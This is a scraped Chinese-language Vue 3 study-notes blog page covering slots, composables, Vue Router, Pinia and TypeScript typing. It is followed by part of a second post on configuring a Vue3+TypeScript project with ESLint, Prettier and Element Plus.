\u0026lt;template #item=\u0026#34;{ body, username, likes }\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ body }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;by {{ username }} | {{ likes }} likes\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/FancyList\u0026gt; 在 \u0026lt;FancyList\u0026gt; 之中，我们可以多次渲染 \u0026lt;slot\u0026gt; 并每次都提供不同的数据 (注意我们这里使用了 v-bind 来传递插槽的 props)：\n1 2 3 4 5 \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;item in items\u0026#34;\u0026gt; \u0026lt;slot name=\u0026#34;item\u0026#34; v-bind=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 小提示：没有参数的 v-bind 会将一个对象的所有属性都作为 attribute 应用到目标元素上。\n依赖注入 一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件树，无论层级有多深，都可以注入由父组件提供给整条链路的依赖。\n组合式函数 鼠标跟踪器示例 如果我们要直接在组件中使用组合式 API 实现鼠标跟踪功能，它会是这样的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script setup\u0026gt; import { ref, onMounted, onUnmounted } from \u0026#39;vue\u0026#39; const x = ref(0) const y = ref(0) function update(event) { x.value = event.pageX y.value = event.pageY } onMounted(() =\u0026gt; window.addEventListener(\u0026#39;mousemove\u0026#39;, update)) onUnmounted(() =\u0026gt; window.removeEventListener(\u0026#39;mousemove\u0026#39;, update)) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt;Mouse position is at: {{ x }}, {{ y }}\u0026lt;/template\u0026gt; 但是，如果我们想在多个组件中复用这个相同的逻辑呢？我们可以把这个逻辑以一个组合式函数的形式提取到外部文件中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // mouse.js import { ref, onMounted, onUnmounted } from \u0026#39;vue\u0026#39; // 按照惯例，组合式函数名以“use”开头 export function useMouse() { // 被组合式函数封装和管理的状态 const x = ref(0) const y = ref(0) // 组合式函数可以随时更改其状态。 function update(event) { x.value = event.pageX y.value = event.pageY } // 一个组合式函数也可以挂靠在所属组件的生命周期上 // 来启动和卸载副作用 onMounted(() =\u0026gt; window.addEventListener(\u0026#39;mousemove\u0026#39;, update)) onUnmounted(() =\u0026gt; window.removeEventListener(\u0026#39;mousemove\u0026#39;, update)) // 通过返回值暴露所管理的状态 return { x, y } } 下面是它在组件中使用的方式：\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; import { useMouse } from \u0026#39;./mouse.js\u0026#39; const { x, y } = useMouse() \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt;Mouse position is at: {{ x }}, {{ y }}\u0026lt;/template\u0026gt; 约定和最佳实践 命名 组合式函数约定用驼峰命名法命名，并以“use”作为开头。\n输入参数 尽管其响应性不依赖 ref，组合式函数仍可接收 ref 参数。如果编写的组合式函数会被其他开发者使用，你最好在处理输入参数时兼容 ref 而不只是原始的值。unref() 工具函数会对此非常有帮助：\n1 2 3 4 5 6 7 import { unref } from \u0026#39;vue\u0026#39; function useFeature(maybeRef) { // 若 maybeRef 确实是一个 ref，它的 .value 会被返回 // 否则，maybeRef 会被原样返回 const value = unref(maybeRef) } 如果你的组合式函数在接收 ref 为参数时会产生响应式 effect，请确保使用 watch() 显式地监听此 ref，或者在 watchEffect() 中调用 unref() 来进行正确的追踪。\n返回值 你可能已经注意到了，我们一直在组合式函数中使用 ref() 而不是 reactive()。我们推荐的约定是==组合式函数始终返回一个包含多个 ref 的普通的非响应式对象==，这样该对象在组件中被解构为 ref 之后仍可以保持响应性：\n1 2 // x 和 y 是两个 ref const { x, y } = useMouse() 从组合式函数返回一个响应式对象会导致在对象解构过程中丢失与组合式函数内状态的响应性连接。与之相反，ref 则可以维持这一响应性连接。\n如果你更希望以对象属性的形式来使用组合式函数中返回的状态，你可以将返回的对象用 reactive() 包装一次，这样其中的 ref 会被自动解包，例如：\n1 2 3 const mouse = reactive(useMouse()) // mouse.x 链接到了原来的 x ref console.log(mouse.x) 1 Mouse position is at: {{ mouse.x }}, {{ mouse.y }} 自定义指令 directive\n1 \u0026lt;div v-color=\u0026#34;color\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 1 2 3 4 app.directive(\u0026#39;color\u0026#39;, (el, binding) =\u0026gt; { // 这会在 `mounted` 和 `updated` 时都调用 el.style.color = binding.value }) 路由 捕获所有路由或 404 Not found 路由 常规参数只匹配 url 片段之间的字符，用 / 分隔。如果我们想匹配任意路径，我们可以使用自定义的 路径参数 正则表达式，在 路径参数 后面的括号中加入 正则表达式 :\n1 2 3 4 5 6 const routes = [ // 将匹配所有内容并将其放在 `$route.params.pathMatch` 下 { path: \u0026#39;/:pathMatch(.*)*\u0026#39;, name: \u0026#39;NotFound\u0026#39;, component: NotFound }, // 将匹配以 `/user-` 开头的所有内容，并将其放在 `$route.params.afterUser` 下 { path: \u0026#39;/user-:afterUser(.*)\u0026#39;, component: UserGeneric }, ] 路由的匹配语法 在参数中自定义正则 当定义像 :userId 这样的参数时，我们内部使用以下的正则 ([^/]+) (至少有一个字符不是斜杠 / )来从 URL 中提取参数。这很好用，除非你需要根据参数的内容来区分两个路由。想象一下，两个路由 /:orderId 和 /:productName，两者会匹配完全相同的 URL，所以我们需要一种方法来区分它们。最简单的方法就是在路径中添加一个静态部分来区分它们：\n1 2 3 4 5 6 const routes = [ // 匹配 /o/3549 { path: \u0026#39;/o/:orderId\u0026#39; }, // 匹配 /p/books { path: \u0026#39;/p/:productName\u0026#39; }, ] 但在某些情况下，我们并不想添加静态的 /o /p 部分。由于，orderId 总是一个数字，而 productName 可以是任何东西，所以我们可以在括号中为参数指定一个自定义的正则：\n1 2 3 4 5 6 const routes = [ // /:orderId -\u0026gt; 仅匹配数字 { path: \u0026#39;/:orderId(\\\\d+)\u0026#39; }, // /:productName -\u0026gt; 匹配其他任何内容 { path: \u0026#39;/:productName\u0026#39; }, ] 现在，转到 /25 将匹配 /:orderId，其他情况将会匹配 /:productName。routes 数组的顺序并不重要!\nTIP\n确保转义反斜杠( \\ )，就像我们对 \\d (变成\\\\d)所做的那样，在 JavaScript 中实际传递字符串中的反斜杠字符。\n编程式导航 想要导航到不同的 URL，可以使用 router.push 方法。这个方法会向 history 栈添加一个新的记录，所以，当用户点击浏览器后退按钮时，会回到之前的 URL。\n当你点击 \u0026lt;router-link\u0026gt; 时，内部会调用这个方法，所以点击 \u0026lt;router-link :to=\u0026quot;...\u0026quot;\u0026gt; 相当于调用 router.push(...) ：\n声明式 编程式 \u0026lt;router-link :to=\u0026quot;...\u0026quot;\u0026gt; router.push(...) 该方法的参数可以是一个字符串路径，或者一个描述地址的对象。例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 字符串路径 router.push(\u0026#39;/users/eduardo\u0026#39;) // 带有路径的对象 router.push({ path: \u0026#39;/users/eduardo\u0026#39; }) // 命名的路由，并加上参数，让路由建立 url router.push({ name: \u0026#39;user\u0026#39;, params: { username: \u0026#39;eduardo\u0026#39; } }) // 带查询参数，结果是 /register?plan=private router.push({ path: \u0026#39;/register\u0026#39;, query: { plan: \u0026#39;private\u0026#39; } }) // 带 hash，结果是 /about#team router.push({ path: \u0026#39;/about\u0026#39;, hash: \u0026#39;#team\u0026#39; }) 注意：如果提供了 path，params 会被忽略，上述例子中的 query 并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 name 或手写完整的带有参数的 path ：\n1 2 3 4 5 6 7 8 9 const username = \u0026#39;eduardo\u0026#39; // 我们可以手动建立 url，但我们必须自己处理编码 router.push(`/user/${username}`) // -\u0026gt; /user/eduardo // 同样 router.push({ path: `/user/${username}` }) // -\u0026gt; /user/eduardo // 如果可能的话，使用 `name` 和 `params` 从自动 URL 编码中获益 router.push({ name: \u0026#39;user\u0026#39;, params: { username } }) // -\u0026gt; /user/eduardo // `params` 不能与 `path` 一起使用 router.push({ path: \u0026#39;/user\u0026#39;, params: { username } }) // -\u0026gt; /user 当指定 params 时，可提供 string 或 number 参数（或者对于可重复的参数可提供一个数组）。任何其他类型（如 undefined、false 等）都将被自动字符串化。对于可选参数，你可以提供一个空字符串（\u0026quot;\u0026quot;）来跳过它。\n由于属性 to 与 router.push 接受的对象种类相同，所以两者的规则完全相同。\nrouter.push 和所有其他导航方法都会返回一个 Promise，让我们可以等到导航完成后才知道是成功还是失败。我们将在 Navigation Handling 中详细介绍。\n命名视图 有时候想同时 (同级) 展示多个视图，而不是嵌套展示，例如创建一个布局，有 sidebar (侧导航) 和 main (主内容) 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default。\n1 2 3 \u0026lt;router-view class=\u0026#34;view left-sidebar\u0026#34; name=\u0026#34;LeftSidebar\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;router-view class=\u0026#34;view main-content\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;router-view class=\u0026#34;view right-sidebar\u0026#34; name=\u0026#34;RightSidebar\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; 一个视图使用一个组件渲染，因此对于同个路由，多个视图就需要多个组件。确保正确使用 components 配置 (带上 s)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const router = createRouter({ history: createWebHashHistory(), routes: [ { path: \u0026#39;/\u0026#39;, components: { default: Home, // LeftSidebar: LeftSidebar 的缩写 LeftSidebar, // 它们与 `\u0026lt;router-view\u0026gt;` 上的 `name` 属性匹配 RightSidebar, }, }, ], }) 嵌套命名视图 我们也有可能使用命名视图创建嵌套视图的复杂布局。这时你也需要命名用到的嵌套 router-view 组件。我们以一个设置面板为例：\n1 2 3 4 5 6 7 8 9 /settings/emails /settings/profile +-----------------------------------+ +------------------------------+ | UserSettings | | UserSettings | | +-----+-------------------------+ | | +-----+--------------------+ | | | Nav | UserEmailsSubscriptions | | +------------\u0026gt; | | Nav | UserProfile | | | | +-------------------------+ | | | +--------------------+ | | | | | | | | | UserProfilePreview | | | +-----+-------------------------+ | | +-----+--------------------+ | +-----------------------------------+ +------------------------------+ Nav 只是一个常规组件。 UserSettings 是一个视图组件。 UserEmailsSubscriptions、UserProfile、UserProfilePreview 是嵌套的视图组件。 注意：我们先忘记 HTML/CSS 具体的布局的样子，只专注在用到的组件上。\nUserSettings 组件的 \u0026lt;template\u0026gt; 部分应该是类似下面的这段代码:\n1 2 3 4 5 6 7 \u0026lt;!-- UserSettings.vue --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;User Settings\u0026lt;/h1\u0026gt; \u0026lt;NavBar /\u0026gt; \u0026lt;router-view /\u0026gt; \u0026lt;router-view name=\u0026#34;helper\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; 那么你就可以通过这个路由配置来实现上面的布局：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { path: \u0026#39;/settings\u0026#39;, // 你也可以在顶级路由就配置命名视图 component: UserSettings, children: [{ path: \u0026#39;emails\u0026#39;, component: UserEmailsSubscriptions }, { path: \u0026#39;profile\u0026#39;, components: { default: UserProfile, helper: UserProfilePreview } }] } 导航守卫 路由懒加载 当打包构建应用时，JavaScript 包会变得非常大，影响页面加载。如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应组件，这样就会更加高效。\nVue Router 支持开箱即用的动态导入，这意味着你可以用动态导入代替静态导入：\n1 2 3 4 5 6 7 8 9 // 将 // import UserDetails from \u0026#39;./views/UserDetails\u0026#39; // 替换成 const UserDetails = () =\u0026gt; import(\u0026#39;./views/UserDetails\u0026#39;) const router = createRouter({ // ... routes: [{ path: \u0026#39;/users/:id\u0026#39;, component: UserDetails }], }) component (和 components) 配置接收一个返回 Promise 组件的函数，Vue Router 只会在第一次进入页面时才会获取这个函数，然后使用缓存数据。这意味着你也可以使用更复杂的函数，只要它们返回一个 Promise ：\n1 2 3 4 const UserDetails = () =\u0026gt; Promise.resolve({ /* 组件定义 */ }) 一般来说，对所有的路由都使用动态导入是个好主意。\n状态管理 Pinia 参考链接：\nhttps://pinia.web3doc.top/getting-started.html\nPinia 快速入门\npinia 的使用（二）—— state\n安装 1 npm install pinia 创建一个 pinia（根存储）并将其传递给应用程序：\n1 2 3 4 5 6 7 8 9 10 import { createApp } from \u0026#39;vue\u0026#39; import App from \u0026#39;./App.vue\u0026#39; import { createPinia } from \u0026#39;pinia\u0026#39; const app = createApp(App) app.use(createPinia()) app.mount(\u0026#39;#app\u0026#39;) Store Store 是使用 defineStore() 定义的，并且它需要一个唯一名称，作为第一个参数传递：\n1 2 3 4 5 6 7 import { defineStore } from \u0026#39;pinia\u0026#39; // useStore 可以是 useUser、useCart 之类的任何东西 // 第一个参数是应用程序中 store 的唯一 id export const useStore = defineStore(\u0026#39;main\u0026#39;, { // other options... }) 这个 name，也称为 id，是必要的，Pinia 使用它来将 store 连接到 devtools。 将返回的函数命名为 use\u0026hellip; 是跨可组合项的约定，以使其符合你的使用习惯。\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useStore } from \u0026#39;@/store/demo\u0026#39; const store = useStore() console.log(\u0026#34;store.counter:\u0026#34;, store.counter); \u0026lt;/script\u0026gt; 请注意，store 是一个用reactive 包裹的对象，这意味着不需要在getter 之后写.value，但是，就像setup 中的props 一样，我们不能对其进行解构：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default defineComponent({ setup() { const store = useStore() // ❌ 这不起作用，因为它会破坏响应式 // 这和从 props 解构是一样的 const { name, doubleCount } = store name // \u0026#34;eduardo\u0026#34; doubleCount // 2 return { // 一直会是 \u0026#34;eduardo\u0026#34; name, // 一直会是 2 doubleCount, // 这将是响应式的 doubleValue: computed(() =\u0026gt; store.doubleCount), } }, }) 为了从 Store 中提取属性同时保持其响应式，您需要使用storeToRefs()。 它将为任何响应式属性创建 refs。 当您仅使用 store 中的状态但不调用任何操作时，这很有用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { storeToRefs } from \u0026#39;pinia\u0026#39; export default defineComponent({ setup() { const store = useStore() // `name` 和 `doubleCount` 是响应式引用 // 这也会为插件添加的属性创建引用 // 但跳过任何 action 或 非响应式（不是 ref/reactive）的属性 const { name, doubleCount } = storeToRefs(store) return { name, doubleCount } }, }) State 1 2 3 4 5 6 7 8 9 10 11 12 13 import { defineStore } from \u0026#39;pinia\u0026#39; const useStore = defineStore(\u0026#39;storeId\u0026#39;, { // 推荐使用 完整类型推断的箭头函数 state: () =\u0026gt; { return { // 所有这些属性都将自动推断其类型 counter: 0, name: \u0026#39;Eduardo\u0026#39;, isAdmin: true, } }, }) Getters Getter 完全等同于 Store 状态的 计算值。 它们可以用 defineStore() 中的 getters 属性定义。 他们接收“状态”作为第一个参数以鼓励箭头函数的使用：\n1 2 3 4 5 6 7 8 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { doubleCount: (state) =\u0026gt; state.counter * 2, }, }) 大多数时候，getter 只会依赖状态，但是，他们可能需要使用其他 getter。 正因为如此，我们可以在定义常规函数时通过 this 访问到 整个 store 的实例， 但是需要定义返回类型（在 TypeScript 中）。 这是由于 TypeScript 中的一个已知限制，并且不会影响使用箭头函数定义的 getter，也不会影响不使用 this 的 getter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), getters: { // 自动将返回类型推断为数字 doubleCount(state) { return state.counter * 2 }, // 返回类型必须明确设置 doublePlusOne(): number { return this.counter * 2 + 1 }, }, }) 然后你可以直接在 store 实例上访问 getter：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;p\u0026gt;Double count is {{ store.doubleCount }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { setup() { const store = useStore() return { store } }, } \u0026lt;/script\u0026gt; Actions Actions 相当于组件中的 methods。 它们可以使用 defineStore() 中的 actions 属性定义，并且它们非常适合定义业务逻辑：\n1 2 3 4 5 6 7 8 9 10 11 12 13 export const useStore = defineStore(\u0026#39;main\u0026#39;, { state: () =\u0026gt; ({ counter: 0, }), actions: { increment() { this.counter++ }, randomizeCounter() { this.counter = Math.round(100 * Math.random()) }, }, }) 与 getters 一样，操作可以通过 this 访问 whole store instance 并提供完整类型（和自动完成✨）支持。 与它们不同，actions 可以是异步的，您可以在其中await 任何 API 调用甚至其他操作！ 这是使用 Mande 的示例。 请注意，只要您获得“Promise”，您使用的库并不重要，您甚至可以使用浏览器的“fetch”函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { mande } from \u0026#39;mande\u0026#39; const api = mande(\u0026#39;/api/users\u0026#39;) export const useUsers = defineStore(\u0026#39;users\u0026#39;, { state: () =\u0026gt; ({ userData: null, // ... }), actions: { async registerUser(login, password) { try { this.userData = await api.post({ login, password }) showTooltip(`Welcome back ${this.userData.name}!`) } catch (error) { showTooltip(error) // 让表单组件显示错误 return error } }, }, }) 你也可以完全自由地设置你想要的任何参数并返回任何东西。 调用 Action 时，一切都会自动推断！\nActions 像 methods 一样被调用：\n1 2 3 4 5 6 7 8 9 export default defineComponent({ setup() { const main = useMainStore() // Actions 像 methods 一样被调用： main.randomizeCounter() return {} }, }) Vuex TypeScript 与组合式 API 参考链接：\nhttps://cn.vuejs.org/guide/typescript/composition-api.html\n为组件的 props 标注类型 当使用 \u0026lt;script setup\u0026gt; 时，defineProps() 宏函数支持从它的参数中推导类型：\n1 2 3 4 5 6 7 8 9 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; const props = defineProps({ foo: { type: String, required: true }, bar: Number }) props.foo // string props.bar // number | undefined \u0026lt;/script\u0026gt; 这被称之为“运行时声明”，因为传递给 defineProps() 的参数会作为运行时的 props 选项使用。\n然而，通过泛型参数来定义 props 的类型通常更直接：\n1 2 3 4 5 6 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; const props = defineProps\u0026lt;{ foo: string bar?: number }\u0026gt;() \u0026lt;/script\u0026gt; 这被称之为“基于类型的声明”。编译器会尽可能地尝试根据类型参数推导出等价的运行时选项。在这种场景下，我们第二个例子中编译出的运行时选项和第一个是完全一致的。\n基于类型的声明或者运行时声明可以择一使用，但是不能同时使用。\n我们也可以将 props 的类型移入一个单独的接口中：\n1 2 3 4 5 6 7 8 \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; interface Props { foo: string bar?: number } const props = defineProps\u0026lt;Props\u0026gt;() \u0026lt;/script\u0026gt; TypeScript 与选项式 API 参考链接：\nhttps://cn.vuejs.org/guide/typescript/options-api.html\n为组件的 props 标注类型 选项式 API 中对 props 的类型推导需要用 defineComponent() 来包装组件。有了它，Vue 才可以通过 props 以及一些额外的选项，比如 required: true 和 default 来推导出 props 的类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { defineComponent } from \u0026#39;vue\u0026#39; export default defineComponent({ // 启用了类型推导 props: { name: String, id: [Number, String], msg: { type: String, required: true }, metadata: null }, mounted() { this.name // 类型：string | undefined this.id // 类型：number | string | undefined this.msg // 类型：string this.metadata // 类型：any } }) 然而，这种运行时 props 选项仅支持使用构造函数来作为一个 prop 的类型——没有办法指定多层级对象或函数签名之类的复杂类型。\n我们可以使用 PropType 这个工具类型来标记更复杂的 props 类型：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import { defineComponent } from \u0026#39;vue\u0026#39; import type { PropType } from \u0026#39;vue\u0026#39; interface Book { title: string author: string year: number } export default defineComponent({ props: { book: { // 提供相对 `Object` 更确定的类型 type: Object as PropType\u0026lt;Book\u0026gt;, required: true }, // 也可以标记函数 callback: Function as PropType\u0026lt;(id: number) =\u0026gt; void\u0026gt; }, mounted() { this.book.title // string this.book.year // number // TS Error: argument of type \u0026#39;string\u0026#39; is not // assignable to parameter of type \u0026#39;number\u0026#39; this.callback?.(\u0026#39;123\u0026#39;) } }) ","permalink":"https://chance7bin.github.io/posts/note/vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","summary":"参考链接： 一个 Java 猿眼中 Vue3 和 Vue2 的差异 （建议收藏）Vue3 对比 Vue2.x 差异性、注意点、整体梳理，与React hook比又如何？（面试热点） Vue2升级","title":"Vue3学习笔记"},{"content":" **注意：**该笔记记录的是 Vue3 + TypeScript 的项目搭建流程\n参考链接：\nRuoYi(若依开源框架)-前后端分离版-前端流程简单分析\nhttps://github.com/lin-xin/vue-manage-system\nhttps://github.com/Armour/vue-typescript-admin-template\nvue-typescript-admin-template项目初始化\n1.npm install yarn -g\n2.yarn install\n3.npm run serve\n启动时可能会报错：Error: Cannot find module ‘node_modules\\fibers\\bin\\win32-x64-83\\fibers‘ 报错解决方案\n初始化项目 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 E:\\Projects\\OpenGMS-Lab\u0026gt;npm init vue@latest npm WARN config global `--global`, `--local` are deprecated. Use `--location=global` instead. Need to install the following packages: create-vue@latest Ok to proceed? (y) y Vue.js - The Progressive JavaScript Framework √ Project name: ... lab-ui √ Add TypeScript? ... No / Yes √ Add JSX Support? ... No / Yes √ Add Vue Router for Single Page Application development? ... No / Yes √ Add Pinia for state management? ... No / Yes √ Add Vitest for Unit Testing? ... No / Yes √ Add Cypress for both Unit and End-to-End testing? ... No / Yes √ Add ESLint for code quality? ... No / Yes √ Add Prettier for code formatting? ... No / Yes Scaffolding project in E:\\Projects\\OpenGMS-Lab\\lab-ui... Done. Now run: cd lab-ui npm install npm run dev 可能会遇到的问题：\n参考链接：\nTypeError: this.cliEngineCtor is not a constructor，webstorm和eslint的版本纠结\n项目配置 ESLint配置 参考链接：\nVue3+Vite+TS+Eslint（Airbnb规则）搭建生产项目，踩坑详记（一）\n1.安装依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 npm install eslint --save-dev npm install --save-dev @typescript-eslint/parser @typescript-eslint/eslint-plugin # ESLint官方提供的Vue插件，可以检查 .vue文件中的语法错误 npm install eslint-plugin-vue # 使用eslint插件将prettier作为eslint规则执行 npm install --save-dev eslint-plugin-prettier npm install --save-dev --save-exact prettier # 禁用所有与格式相关的eslint规则，也就是说把所有格式相关的校验都交给 prettier 处理 npm install --save-dev eslint-config-prettier 2.配置eslint\n.eslintrc.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 module.exports = { root: true, env: { node: true }, parserOptions: { ecmaVersion: 2020, parser: \u0026#34;babel-eslint\u0026#34; }, parser: \u0026#34;@typescript-eslint/parser\u0026#34;, extends: [ \u0026#34;plugin:vue/recommended\u0026#34;, \u0026#34;eslint:recommended\u0026#34;, \u0026#34;plugin:prettier/recommended\u0026#34; //把所有格式相关的校验都交给 prettier 处理 ], plugins: [\u0026#34;prettier\u0026#34;], rules: { \u0026#34;prettier/prettier\u0026#34;: \u0026#34;error\u0026#34; } }; 3.配置prettier\n有时会遇到 eslint 规则和 prettier 规则冲突的情况。eslint告诉我们要使用单引号，但是改为单引号以后，prettier有告诉我们要使用双引号。\n.prettierrc.js\n1 2 3 4 module.exports = { // 无尾逗号 \u0026#34;trailingComma\u0026#34;: \u0026#34;none\u0026#34; }; unplugin-vue-components 参考链接：\n尤大推荐的神器unplugin-vue-components,解放双手!以后再也不用呆呆的手动引入(组件,ui(Element-ui)库,vue hooks等)\n1.安装\n1 npm install unplugin-vue-components -D 2.配置 vite.config.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { fileURLToPath, URL } from \u0026#34;node:url\u0026#34;; import { defineConfig } from \u0026#34;vite\u0026#34;; import vue from \u0026#34;@vitejs/plugin-vue\u0026#34;; import vueJsx from \u0026#34;@vitejs/plugin-vue-jsx\u0026#34;; import Components from \u0026#34;unplugin-vue-components/vite\u0026#34;; import { ElementPlusResolver } from \u0026#34;unplugin-vue-components/resolvers\u0026#34;; // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), vueJsx(), Components({ resolvers: [ElementPlusResolver()] }) ], resolve: { alias: { \u0026#34;@\u0026#34;: fileURLToPath(new URL(\u0026#34;./src\u0026#34;, import.meta.url)) } } }); 3.插件会生成一个ui库组件以及指令路径components.d.ts文件\n4.将生成的文件加入到tsconfig.json中\nunplugin-auto-import 1.安装\n1 npm i -D unplugin-auto-import 2.配置 vite.config.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 // vite.config.js import { defineConfig } from \u0026#39;vite\u0026#39; import AutoImport from \u0026#39;unplugin-auto-import/vite\u0026#39; export default defineConfig({ plugins: [ AutoImport({ imports: [\u0026#39;vue\u0026#39;, \u0026#39;vue-router\u0026#39;, \u0026#39;vue-i18n\u0026#39;, \u0026#39;@vueuse/head\u0026#39;, \u0026#39;@vueuse/core\u0026#39;], // 可以选择auto-import.d.ts生成的位置，使用ts建议设置为\u0026#39;src/auto-import.d.ts\u0026#39; // dts: \u0026#39;src/auto-import.d.ts\u0026#39; }) ] }) 解决ESLint: 'defineStore' is not defined.(no-undef)\nunplugin-auto-import的配置和eslint报错解决\nvite-plugin-vue-setup-extend 参考链接：\nhttps://blog.csdn.net/ruisenLi/article/details/124385175\n1.安装\n1 npm i vite-plugin-vue-setup-extend -D 2.配置 vite.config.ts\n1 2 3 4 5 import { defineConfig } from \u0026#39;vite\u0026#39; import VueSetupExtend from \u0026#39;vite-plugin-vue-setup-extend\u0026#39; export default defineConfig({ plugins: [ VueSetupExtend() ] }) 3.使用\n1 2 3 \u0026lt;script lang=\u0026#34;ts\u0026#34; setup name=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; 其他配置 ==导入类型检查的时候报错==\nTS1444: \u0026lsquo;RouteRecordRaw\u0026rsquo; is a type and must be imported using a type-only import when \u0026lsquo;preserveValueImports\u0026rsquo; and \u0026lsquo;isolatedModules\u0026rsquo; are both enabled.\n1 import { createRouter, createWebHashHistory, RouteRecordRaw } from \u0026#34;vue-router\u0026#34;; 修改为：\n1 2 import { createRouter, createWebHashHistory } from \u0026#34;vue-router\u0026#34;; import type { RouteRecordRaw } from \u0026#34;vue-router\u0026#34;; ==ESLint问题及解决方案： Parsing error: Unexpected token==\n参考链接：\nhttps://juejin.cn/post/7010688306383945742\n添加'parser': '@typescript-eslint/parser'，记得需要安装依赖npm install @typescript-eslint/parser --save-dev。\n修改后的.eslintrc.js\n1 2 3 4 5 // .eslintrc.js文件 \u0026#39;parser\u0026#39;: \u0026#39;@typescript-eslint/parser\u0026#39;, \u0026#39;parserOptions\u0026#39;: { \u0026#39;parser\u0026#39;: \u0026#39;babel-eslint\u0026#39;, }, ==引入自己的组件报错 Cannot find module \u0026lsquo;\u0026lsquo;xx\u0026rsquo;\u0026rsquo; or its corresponding type declarations.==\n参考链接：\nvue + ts中的shims-vue.d.ts文件的作用，在ts中引入vue-echarts等vue文件\n在env.d.ts中声明所有的.vue后缀文件\n1 2 3 4 5 declare module \u0026#39;*.vue\u0026#39; { import type { DefineComponent } from \u0026#39;vue\u0026#39; const component: DefineComponent\u0026lt;{}, {}, any\u0026gt; export default component } ==ESLint: this.libOptions.parse is not a function==\n参考链接：\nESLint: TypeError: this.libOptions.parse is not a function – Code Example\n1 npm install eslint@8.22.0 --save-exact ElementPlus 1.安装\n1 npm install element-plus --save 2.全局配置\n1 2 3 4 5 6 import ElementPlus from \u0026#39;element-plus\u0026#39; import zhCn from \u0026#39;element-plus/es/locale/lang/zh-cn\u0026#39; app.use(ElementPlus, { locale: zhCn, }) pinia 创建项目时自动安装\nrouter 创建项目时自动安装\n布局 App.vue\n1 2 3 4 5 6 7 8 \u0026lt;template\u0026gt; \u0026lt;router-view /\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; @import \u0026#39;./assets/css/main.css\u0026#39;; @import \u0026#39;./assets/css/color-dark.css\u0026#39;; \u0026lt;/style\u0026gt; router/index.ts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { createRouter, createWebHistory } from \u0026#34;vue-router\u0026#34;; import HomeView from \u0026#34;../views/HomeView.vue\u0026#34;; const router = createRouter({ history: createWebHistory(import.meta.env.BASE_URL), routes: [ { path: \u0026#34;/\u0026#34;, name: \u0026#34;home\u0026#34;, component: HomeView }, { path: \u0026#34;/about\u0026#34;, name: \u0026#34;about\u0026#34;, // route level code-splitting // this generates a separate chunk (About.[hash].js) for this route // which is lazy-loaded when the route is visited. component: () =\u0026gt; import(\u0026#34;../views/AboutView.vue\u0026#34;) } ] }); export default router; 图标 element图标 1.安装element依赖\n1 npm install @element-plus/icons-vue 2.注册所有图标\n需要从 @element-plus/icons-vue 中导入所有图标并进行全局注册。\n1 2 3 4 5 6 7 8 9 // main.ts // 如果您正在使用CDN引入，请删除下面一行。 import * as ElementPlusIconsVue from \u0026#39;@element-plus/icons-vue\u0026#39; const app = createApp(App) for (const [key, component] of Object.entries(ElementPlusIconsVue)) { app.component(key, component) } 3.基础用法\n1 2 3 4 5 6 7 8 9 10 \u0026lt;!-- Use el-icon to provide attributes to SVG icon --\u0026gt; 